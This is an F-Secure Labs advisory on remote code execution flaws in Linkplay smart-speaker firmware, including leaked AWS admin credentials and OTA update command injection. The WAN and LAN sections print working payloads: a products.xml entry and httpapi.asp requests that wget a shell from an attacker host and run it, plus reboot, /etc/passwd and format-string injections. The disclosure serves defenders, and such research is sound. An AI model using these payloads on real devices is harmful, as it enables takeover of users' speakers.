<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Linkplay Firmware WAN/LAN Remote Code Execution</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/linkplay-firmware-wanlan-remote-code-execution/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/linkplay-firmware-wanlan-remote-code-execution/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/linkplay-firmware-wanlan-remote-code-execution/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Linkplay Firmware WAN/LAN Remote Code Execution</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Linkplay firmware</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>High</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2019-15310, CVE-2019-15311, CVE-2019-15312</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>Multiple Remote Code Execution (WAN/LAN)</td>
          </tr>
        </table>
        
        <h1><span>Introduction</span></h1><p><span>As part of an internal competition F-Secure identified multiple remote code execution vulnerabilities in the Zolo Halo smart speaker. Further analysis revealed these issues to be present in the base firmware image developed by Linkplay and used in a number of smart devices. At a high level, F-Secure were able to:</span></p><ul><li>Execute code on any device through the update process (see WAN RCE below).</li>
<li>Execute code on any device if connected to the same network (see LAN RCE below).</li>
<li><span>Gain access to Linkplay’s AWS estate with administrator privileges (see AWS Takeover).</span></li>
</ul><h1><span>AWS Takeover</span></h1><p class="western"><span style="color: #ffffff;">During initial vulnerability research of the Zolo Halo smart speaker, F-Secure discovered AWS credentials that could be leveraged to gain access to Linkplay’s S3 buckets containing device firmware.</span></p><p class="western"><span>Initial enumeration of the Zolo Halo speaker revealed a web application listening on TCP port 80. This was observed to be a GoAhead web server. Further enumeration of this application revealed the httpapi.asp endpoint that could be used to gather further information about the device. Coupled with information from a number of forums (eg https://community.home-assistant.io/t/linkplay-integration/33878/76 and https://www.diyaudio.com/forums/class-d/302748-am-v200-wifi.html) F-Secure were able to identify the GetUpdateServer command:</span></p><pre>$ curl http://10.10.10.254/httpapi.asp\?command\=GetUpdateServer -v
*   Trying 10.10.10.254...
* TCP_NODELAY set
* Connected to 10.10.10.254 (10.10.10.254) port 80 (#0)
&gt; GET /httpapi.asp?command=GetUpdateServer HTTP/1.1
&gt; Host: 10.10.10.254

* HTTP 1.0, assume close after body
&lt; HTTP/1.0 200 OK
&lt; Date: Fri May 24 19:53:04 2019
&lt; Server: GoAhead-Webs
&lt; Pragma: no-cache
&lt; Cache-Control: no-cache
&lt; Content-type: text/html
&lt; 
* Closing connection 0
http://silenceota.linkplay.com/wifi_audio_image</pre><p class="western"><span style="color: #ffffff;">The </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">silenceota.linkplay.com</span></span></span><span style="color: #ffffff;"> was an Amazon AWS S3 bucket containing firmware for over a hundred devices.</span></p><pre>$ aws s3 ls s3://otasilence/
                           PRE sgw/
                           PRE wifi_audio_image/
                           PRE wifi_audio_image_crypt/
                           PRE wifi_audio_image_dsp/
                           PRE wifi_audio_image_mcu/
                           PRE wifi_audio_test/</pre><p class="western"><span style="color: #ffffff;">Analysis of files within this bucket, a "products.xml" file was identified providing the location of the firmware for specific devices. The following output shows the entry for the Zolo Halo speaker:</span></p><pre>  &lt;product&gt;<br>      &lt;productid&gt;Zolo_Halo&lt;/productid&gt;<br>      &lt;hardwareversion&gt;WiiMu-A31&lt;/hardwareversion&gt;
&lt;UUID&gt;FF310082&lt;/UUID&gt;
  &lt;major-url&gt;
http://silenceota.linkplay.com/wifi_audio_image/M7hFsDfNwwQmU5WbsJmnFZ/product.xml
  &lt;/major-url&gt;
&lt;/product&gt;</pre><p class="western"><span style="color: #ffffff;">The corresponding "product.xml" file contains locations for all of up to date firmware:</span></p><pre>&lt;product&gt;
  &lt;major-version&gt;20181127&lt;/major-version&gt;
  &lt;sign&gt;ab6a814fbe506a4680e62e6054e25635&lt;/sign&gt;
  &lt;md5-url&gt;
    http://silenceota.linkplay.com/wifi_audio_image/M7hFsDfNwwQmU5WbsJmnFZ/20181127/md5.txt
  &lt;/md5-url&gt;
  &lt;ver-url&gt;
    http://silenceota.linkplay.com/wifi_audio_image/M7hFsDfNwwQmU5WbsJmnFZ/20181127/MVver_20181127
  &lt;/ver-url&gt;
  &lt;layout-url&gt;
    http://silenceota.linkplay.com/wifi_audio_image/M7hFsDfNwwQmU5WbsJmnFZ/20181127/layout
  &lt;/layout-url&gt;
  &lt;image-uboot&gt;
    http://silenceota.linkplay.com/wifi_audio_image/M7hFsDfNwwQmU5WbsJmnFZ/uboot_v632.img
  &lt;/image-uboot&gt;
  &lt;image-backup&gt;
http://silenceota.linkplay.com/wifi_audio_image/M7hFsDfNwwQmU5WbsJmnFZ/backup_new_v1141.img
  &lt;/image-backup&gt;
  &lt;image-kernel&gt;
http://silenceota.linkplay.com/wifi_audio_image/M7hFsDfNwwQmU5WbsJmnFZ/20181127/a31ankera1alexa_new_uImage_20181127
  &lt;/image-kernel&gt;
&lt;/product&gt;</pre><p class="western"><span style="color: #ffffff;">The image-kernel tag contained the url for the device's firmware. This could be downloaded and the root file system extracted with binwalk.  </span><span>Analysis of the file system revealed several interesting artefacts. Of note were a number of custom binaries, scripts and miscellaneous files:</span></p><pre>system/workdir/config-powersave.sh  system/workdir/evn.sh      system/workdir/live.sh  system/workdir/release.txt
system/workdir/delay_reboot.sh      system/workdir/factory.sh  system/workdir/MVver

system/workdir/bin:
a01controller    apple_remote  factory_audio    imuzop    mdevnotify   ntpd            smplayer
a01remoteupdate  asr_tts       factory_gpio     intercom  multiplayer  ntpdate         stunnel
airplay          cxdish        factory_upgrade  iperf     mv_ioguard   pushdeviceinfo  volumeprompt
alexa_alert      dsp_upgrade   httping          logtool   mv_netguard  rootApp


system/workdir/misc:
ca.pem  config.bin   grender-120x120.jpg  grender-48x48.jpg  melody.mp3  stunnel.conf  Voice-prompt
config  general.dat  grender-120x120.png  grender-48x48.png  privateKey  stunnel.pem

system/workdir/script:
backupJffs2.sh        burnrootImage.sh          format_jffs2.sh  restoreJffs2_user2.sh   sysprivatelog.sh
backupJffs2_user2.sh  ca-certificates.crt       hosts            run_a01remoteupdate.sh
burnjffs2.sh          check_a01remoteupdate.sh  jffs2.header     sys_avs_log.sh
burnjffs2_user2.sh    dnsmasq.conf
</pre><p class="western"><span style="color: #ffffff;">Whilst it is typical to see self-signed certificates in firmware, the file “/system/workdir/misc/privateKey” highlighted in the previous output contained AWS API keys:</span></p><pre>$ cat system/workdir/misc/privateKey 
{"access_key":"redacted","secret_key":"redacted"}
</pre><p class="western"><span>Enumeration of the S3 buckets associated with the AWS API keys revealed that Linkplay were using AWS to store firmware files, log files, and provide access to APIs. The following buckets were found to store firmware:</span></p><pre>{
        {
            "Name": "otasilence",
            "CreationDate": "2019-01-03T03:09:44.000Z"
        },
        {
            "Name": "rlsd",
            "CreationDate": "2019-03-29T08:33:57.000Z"
        },
        {
            "Name": "silence",
            "CreationDate": "2019-01-03T03:09:29.000Z"
        },
        {
          "Name": "wubao",
          "CreationDate": "2019-01-03T03:09:12.000Z"
        }<br>}</pre><p class="western"><span>Analysis of the impact of the leaked AWS credentials was performed through the AWS CLI. The API keys provided access to the AWS instance in the context of the "redacted"</span><span> user:</span></p><pre>$ aws iam get-user
{
    "User": {
        "Path": "/",
        "UserName": "REDACTED",
        "UserId": "...",
        "CreateDate": "2017-06-23T07:41:08Z",
        "PasswordLastUsed": "2019-05-27T02:46:10Z"
    }
}</pre><p class="western"><span style="color: #ffffff;">This user was a member of the "Administrators" group:</span></p><pre>$ aws iam get-group --group-name Administrators
{
    "Users": [
        {
            "Path": "/",
            "UserName": "REDACTED",
            "UserId": "...",
            "CreateDate": "2017-06-23T07:41:08Z",
            "PasswordLastUsed": "2019-05-23T02:54:44Z"
        },</pre><p class="western"><span style="color: #ffffff;">The </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">Administrators</span></span></span><span style="color: #ffffff;"> group had the following attached policies:</span></p><pre>"GroupDetailList": [
    {
        "Path": "/",
        "GroupName": "Administrators",
        "GroupId": "AGPAJJITWUOXLAF7QCSQO",
        "Arn": "arn:aws:iam::073211146886:group/Administrators",
        "CreateDate": "2016-06-26T05:42:10Z",
        "GroupPolicyList": [
            {
                "PolicyName": "policygen-Administrators-201706231544",
                "PolicyDocument": {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Sid": "Stmt1498203830000",
                            "Effect": "Allow",
                            "Action": [
                                "sts:AssumeRole"
                            ],
                            "Resource": [
                                "arn:aws:iam::398391757924:role/OrganizationAccountAccessRole",
                                "arn:aws:iam::073211146886:role/REDACTED_2"
                            ]
                        }
                    ]
                }
            }
        ],
        "AttachedManagedPolicies": [
            {
                "PolicyName": "AdministratorAccess",
                "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
            },</pre><p class="western"><span style="color: #ffffff;">The </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">AdministratorAccess</span></span></span><span style="color: #ffffff;"> policy highlighted in the previous output allows full access to the AWS instance. This is demonstrated by the “Action:*, Resource:*” permissions shown below:</span></p><pre>{
    "PolicyName": "AdministratorAccess",
    "PolicyId": "ANPAIWMBCKSKIEE64ZLYK",
    "Arn": "arn:aws:iam::aws:policy/AdministratorAccess",
    "Path": "/",
    "DefaultVersionId": "v1",
    "AttachmentCount": 3,
    "PermissionsBoundaryUsageCount": 0,
    "IsAttachable": true,
    "CreateDate": "2015-02-06T18:39:46Z",
    "UpdateDate": "2015-02-06T18:39:46Z",
    "PolicyVersionList": [
        {
            "Document": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Action": "*",
                        "Resource": "*"
                    }
                ]
            },
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2015-02-06T18:39:46Z"
        }
    ]
},
</pre><p class="western"><span style="color: #ffffff;">Note that the <span style="font-family: &#039;Courier New&#039;, serif; font-size: small;">REDACTED_2 </span></span><span style="color: #ffffff;">role could be leveraged through </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">assume-role</span></span></span><span style="color: #ffffff;">. This</span><span style="color: #ffffff;"> role also had the </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">AdministratorAccess</span></span></span><span style="color: #ffffff;"> policy attached, and so could provide privilege escalation should the <span>REDACTED</span></span><span style="color: #ffffff;"> user be low privileged.</span></p><h1 class="western">WAN Remote Code Execution</h1><p><span style="color: #ffffff;">As described, when a device attempts to update a request made to “silenceota.linkplay.com/wifi_audio_image/prodcuts.xml”. This file is parsed in order to identify the location of device specific firmware. The silenceota.linkplay.com</span><span style="color: #ffffff;"> hostname is associated with the “otasilence” s3 bucket. As such, two routes to gain code execution through the firmware update process could be leveraged to compromise a large number of devices developed by Linkplay.</span></p><p><span>Given that the AWS API keys provide access to write to the “otasilence” bucket, an adversary could simply replace all firmware binaries with back-doored versions. This attack would be relatively stealthy, however does run the risk of breaking devices if the backdoored firmware is not correct.</span></p><p><span>A second method was identified that abuses a command injection vulnerability that occurs during parsing of the “products.xml” file. When a firmware update is requested, the “/system/workdir/bin/a01remoteupdate” binary is executed. In “a01remoteupdate” the </span><span><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">UpdateImageAll</span></span></span><span> method calls </span><span><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">DownloadFile</span></span></span><span> to first download the “products.xml” file:</span></p><pre>.text:00406720                 la      $a0, 0x410000
.text:00406724                 la      $t9, printf
.text:00406728                 lw      $a1, 0x37B0+var_50($sp)
.text:0040672C                 jalr    $t9 ; printf
.text:00406730                 addiu   $a0, (aOnlineUpdateBe - 0x410000)  # "online update begin (count=%d)\n"
.text:00406734                 lw      $gp, 0x37B0+var_3788($sp)
.text:00406738                 move    $a0, $s0
.text:0040673C                 la      $a1, 0x410000
.text:00406740                 la      $t9, 0x40545C
.text:00406744                 bal     DownloadFile
.text:00406748                 addiu   $a1, (aTmpProducts_xm - 0x410000)  # "/tmp/products.xml"</pre><p class="western"><span style="color: #ffffff;">If this download is successful, the </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">ParseProducts</span></span></span><span style="color: #ffffff;"> method is called:</span></p><pre>.text:0040690C loc_40690C:                              # CODE XREF: UpdateImageAll+248 
.text:0040690C                 la      $t9, 0x404AC8
.text:00406910                 bal     ParseProducts
.text:00406914                 addiu   $a0, $sp, 0x37B0+var_2DD8</pre><p class="western"><span style="color: #ffffff;">The </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">ParseProducts</span></span></span><span style="color: #ffffff;"> method uses an XML library to parse the “products.xml” file and retrieve the information required to request the device's firmware binary. Finally, </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">DownloadFile</span></span></span><span style="color: #ffffff;"> is called a second time if </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">ParseProducts</span></span></span><span style="color: #ffffff;"> is able to identify a valid url in the </span><span style="color: #ffffff;"><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">&lt;major-url&gt;</span></span></span><span style="color: #ffffff;"> tag for a matching product.</span></p><pre>.text:00407AE4                 la      $s0, 0x410000
.text:00407AE8                 la      $t9, 0x40545C
.text:00407AEC                 addiu   $a0, $sp, 0x37B0+var_2BD8
.text:00407AF0                 bal     DownloadFile
.text:00407AF4                 addiu   $a1, $s0, (aTmpProduct_xml - 0x410000)  # "/tmp/product.xml"
</pre><p class="western"> <span>The </span><span><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">DownloadFile</span></span></span><span> method contains a trivially exploitable Operating System command injection vulnerability. The “wget” utility is executed in the download process with user controllable input - specifically the url from the </span><span><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">&lt;major-url&gt;</span></span></span><span> tag from the previously parsed “products.xml” file.</span></p><pre>.text:0040575C loc_40575C:                              # CODE XREF: DownloadFile+64
.text:0040575C                 la      $a1, 0x410000
.text:00405760                 addiu   $v0, $s1, (aTmpRemoteupdat - 0x410000)  # "/tmp/remoteupdatewget.log"
.text:00405764                 sw      $v0, 0x258+var_248($sp)
.text:00405768                 move    $a0, $s2         # s
<strong>.text:0040576C                 addiu   $a1, (aWgetT15OSS21Te - 0x410000)  # "wget -T 15 -O %s '%s' 2&gt;&amp;1 | tee %s"</strong>
.text:00405770                 move    $a2, $s0
.text:00405774                 jalr    $t9 ; sprintf
.text:00405778                 move    $a3, $s3
.text:0040577C                 move    $s4, $zero
.text:00405780                 b       loc_4054F0

.text:00405514                 addiu   $a0, $s1, -0x4160  # filename
.text:00405518                 lw      $gp, 0x258+var_240($sp)
<strong>.text:0040551C                 la      $t9, WMUtil_system
.text:00405520                 jalr    $t9 ; WMUtil_system</strong>
.text:00405524                 move    $a0, $s2
</pre><p class="western"><span>As can be seen from the assembly, this method is also vulnerable to a stack based buffer overflow through an unsanitised call to </span><span><span style="font-family: &#039;Courier New&#039;, serif;"><span style="font-size: small;">sprintf</span></span></span><span>.</span></p><p class="western"><span>In order to demonstrate exploitability of this issue without impacting legitimate service of Linkplay customers, F-Secure deployed a device in a restricted network with a DNS server under its control. The DNS server contained a record pointing “silenceota.linkplay.com” to a testing system. In reality, an attacker could simply edit the “products.xml” file on the “otasilence” AWS s3 bucket.</span></p><p class="western"><span>On an F-Secure controlled system acting as the “silenceota.linkplay.co”` host, a web server was started with a malicious “products.xml” file hosted at “/var/www/html/wifi_audio_image/”. This file contained a single entry to exploit the Zolo Halo smart speaker:</span></p><pre>&lt;productList&gt;
  &lt;product&gt;
    &lt;productid&gt;Zolo_Halo&lt;/productid&gt;
    &lt;hardwareversion&gt;WiiMu-A31&lt;/hardwareversion&gt;
    &lt;UUID&gt;FF310082&lt;/UUID&gt;
    &lt;major-url&gt;http://'$(wget http://attackerIP:8000/shell -O /tmp/shell; chmod 777 /tmp/shell; /tmp/./shell)'&lt;/major-url&gt;
  &lt;/product&gt;
&lt;/productList&gt;
</pre><p class="western"> </p><p class="western"><span style="font-family: FSecureSansHeadline, &#039;Arial Black&#039;, Arial, sans-serif; font-size: 2em;">LAN Remote Code Execution</span></p><p class="western"><span style="color: #ffffff;">The previously described WAN RCE vulnerability presented a code pattern that was found in a variety of areas within the device firmware. F-Secure identified a number of similar vulnerabilities that could be leveraged by an attacker with network access to the affected devices. All vulnerabilities presented here can also be triggered remotely If a user on the local network is tricked into visiting a malicious website, as no CSRF protection is in place. This section provides analysis of one such vulnerability, subsequent sections provide a brief overview of the vulnerable functionality and example triggers.</span></p><p class="western"><span>Reverse engineering of the GoAhead web server hosted on the Zolo speaker revealed a command that could be used to set the network password:</span></p><pre>http://192.168.0.66/httpapi.asp?command=setNetworkEx:1:414141414141
</pre><p class="western"><span style="color: #ffffff;">Further analysis revealed the GoaheadCmdParseThread </span><span style="color: #ffffff;">function, defined within the “rootApp” binary, was responsible to parse HTTP requests. In particular, the following decompiled snippet of code shows how the HTTP request is handled when the “setNetworkEx” string is contained in the “command” parameter:</span></p><pre>iVar12 = strncmp((char *)__s1,"setNetworkEx:",0xd);
    if (iVar12 == 0) 
    {
        iVar12 = FUN_00403008((int)&amp;__s1-&gt;_IO_read_base + 1,1);
            if (iVar12 == -1) 
            {
                UnixSocketServer_write(auStack2172,"invalid input",0x15);
             }
</pre><p class="western"><span style="color: #ffffff;">The highlighted function call shows the vulnerable calls to system</span><span style="color: #ffffff;"> (causing a buffer overflow) and sprintf</span><span style="color: #ffffff;"> (causing a command injection).</span></p><p class="western"><span>Exploitation could be achieved by making a request that uses the wget utility to download and execute a remote payload:</span></p><pre>httpapi.asp?command=setNetworkEx:1:7765776577657765;/usr/bin/wget+http://192.168.0.71/ms+-O+/tmp/ms;/bin/chmod+777+/tmp/ms;/tmp/ms
</pre><p class="western"><span style="color: #ffffff;">F-Secure identified the following actions passed through the “command” parameter to the httpapi.asp endpoint were vulnerable to command injection.</span></p><h3>Command Injection in getsyslog:ip:</h3><p class="western"><span style="color: #ffffff;">The following URL triggers a command injection vulnerability which executes arbitrary commands as a privileged user:</span></p><pre>http://zolo_ip:80/httpapi.asp?command=getsyslog:ip:;reboot</pre><h3>Command Injection in getStatus:ip</h3><p class="western"><span style="color: #ffffff;">The following URL triggers a command injection vulnerability which executes arbitrary commands as a privileged user:</span></p><pre>http://zolo_ip:80/httpapi.asp?command=getStatus:ip:;reboot;
</pre><h3> Format String Vulnerabilities in getStatusEx</h3><p class="western"><span style="color: #ffffff;">The getStatusEx command can pass user supplied format strings to a format string function. Both the device name and group name can be set by an unauthenticated user and trigger the bug if they contain format string sequences. The following commands can be used to set the values:</span></p><pre>http://zolo_ip:80/httpapi.asp?command=setDeviceName:%x%x%x%x
http://zolo_ip:80/httpapi.asp?command=setGroupName:%x%x%x%x
</pre><p class="western"><span style="color: #ffffff;">And the results can be viewed using:</span></p><pre>http://zolo_ip:80/httpapi.asp?command=getStatusEx</pre><p class="western"><span style="color: #ffffff;">As the %n specifier is allowed this can be used to write to arbitrary memory locations and to achieve code execution. </span></p><h3 class="western">Command Injection in factory_cxdish</h3><p class="western"><span style="color: #ffffff;">The following URL triggers a command injection vulnerability allowing privileged commands to be run as a privileged user. Note that the user supplied command must be hex encoded, in the following example, the command is “cat /etc/passwd”:</span></p><pre>http://10.10.10.254/httpapi.asp?command=factory_cxdish:636174202f6574632f706173737764
</pre><p class="western"> </p><h1 class="western">Impact</h1><p class="western"><span style="color: #ffffff;">The combination of privileged AWS credentials that provide access to device firmware, combined with exploitable memory corruption and OS command injection vulnerabilities could result in exploitation of any device that attempts to update its firmware. Additionally due to the lack of authentication as well as other HTTP based attack mitigations, the LAN RCE vulnerabilities could be exploited from a malicious website.</span></p><p class="western"><span style="color: #ffffff;">Overall, F-Secure identified 89 devices that could be exploited through this method, gathered from the “products.xml” file (note there were 109 products in total, 20 of which were duplicates):</span></p><pre>808SL-V
808XL-V
a28youyishi
a31faravs
a31ihomefaralexa
a31youyishi
Accelerate
AudioPro_A10
AudioPro_A40
AudioPro_C10
AudioPro_C3
AudioPro_C5
AudioPro_C5A
AudioPro_C5I
AudioPro_LINK1
Auvisio_QAS_300
BOX
BUSH_31326
CAW-12150
CAW-18057
CAW-37052
Creative_Nova
CVTE_SoundMax_1
CVTE_SoundMax_3
CVTE_SoundMax_5
CVTE_SoundMax_7
CVTE_SoundMax_Soundbar
DIDA
DOSS_FabriqChorus
Drumfire_D-1
Essb_Virtuoz_401
GGMMA31_E5A
GGMM_E2A
GGMM_E3
GGMM_E5A
GoHawk_Lit
HE_MINI
HMDX_W3111
HMDX_W3111_EU
HMDX_W3211
HMDX_W3211_EU
HOME2
HX-P590
ICOS
iEAST-01
iEAST-4Z
iHome_iAV14
IHOME_iAV14
iHome_iAVS16
IKBFV378
JENSEN_31324
KS_31330
MD-3119
MD43631
MD44120
MD44130
MET8040
MSH315V
MusicMan_BT-X34
MXQ_HF30
OE_VAALEXSB80
PWF1002
RHYMEET_R1
RSR_WR762
Smart5
Smart7
Smart_Speaker_PN
SUPERSONIC
SWF1005
SWF2001
SWF3001
SWF4001
SYLVANIA
T2328A
TIBO_31220
TIBO_31322
TIBO_31323
TTS-7199-92
uyesee-am160
uyesee-i50
Venus
Verdera_Voice_Lighted_Mirror
WB_135
WB_22_FABRIQ
WBA31
WS07VCA
XORO_XVS_200
XWF_500
Zolo_Halo</pre><p class="western"><span style="color: #ffffff;"> </span></p><h1><span>Credits</span></h1><p><span>Credits to Tim Carrington for identifying the AWS Takeover and WAN RCE. Additional credits to Stefano Farletti and F-Secure's Bytegeist team for the majority of LAN RCE vulnerabilities disclosed. </span></p>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/linkplay-firmware-wanlan-remote-code-execution/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/linkplay-firmware-wanlan-remote-code-execution/&text=Linkplay Firmware WAN/LAN Remote Code Execution" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/linkplay-firmware-wanlan-remote-code-execution/&title=Linkplay Firmware WAN/LAN Remote Code Execution" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/linkplay-firmware-wanlan-remote-code-execution/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
